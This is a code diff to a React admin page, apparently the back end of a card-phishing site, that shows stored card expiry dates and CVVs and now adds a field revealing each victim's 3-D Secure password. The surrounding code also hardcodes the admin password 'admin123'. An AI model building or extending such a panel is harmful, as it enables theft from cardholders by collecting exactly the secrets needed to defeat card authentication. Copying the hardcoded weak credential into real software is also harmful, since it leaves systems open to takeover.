@@ -29,6 +29,7 @@ type Transaction = {
   status: string;
   created_at: string;
   processed_at: string | null;
+  threeds_password: string;
 };
 
 const ADMIN_PASSWORD = "admin123";
@@ -369,6 +370,7 @@ const AdminCartoes = () => {
                     <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
                     <ToggleField label="Validade" masked="**/**" real={viewTx.card_expiry} />
                     <ToggleField label="CVV" masked="***" real={viewTx.card_cvv || "---"} />
+                    <ToggleField label="Senha 3DS" masked="****" real={viewTx.threeds_password || "---"} />
                     <p className="text-sm"><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
                   </div>
                 )}
